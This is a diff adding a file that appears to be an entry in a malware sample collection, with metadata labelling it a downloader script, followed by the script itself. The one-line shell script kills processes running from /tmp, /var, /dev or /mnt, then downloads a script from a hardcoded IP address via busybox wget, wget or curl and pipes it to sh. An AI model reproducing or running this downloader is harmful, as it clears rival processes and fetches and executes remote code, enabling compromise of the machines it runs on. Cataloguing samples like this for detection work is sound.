@@ -1,0 +1,10 @@
+# sha256: bfa2497706cd9fb49de535c8d11ae11fb267b83edeb4a66f510409e4123a1981
+# family: downloader
+# kind: script
+# size_bytes: 330
+# first_seen: 2026-07-17 06:06:17.625166 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+for p in /proc/[0-9]*;do pi=${p##*/};el=`ls -l "$p/exe"`||continue;case "$el" in */lib/*) continue;;esac;case "$el" in *"/tmp/"*|*"/var/"*|*"/dev/"*|*"/mnt/"*)kill -9 "$pi";esac;done;(busybox wget -qO- http://45.153.34.153/rondo.\bmv.sh||wget -qO- http://45.153.34.153/rondo.\bmv.sh||curl -s http://45.153.34.153/rondo.\bmv.sh)|sh
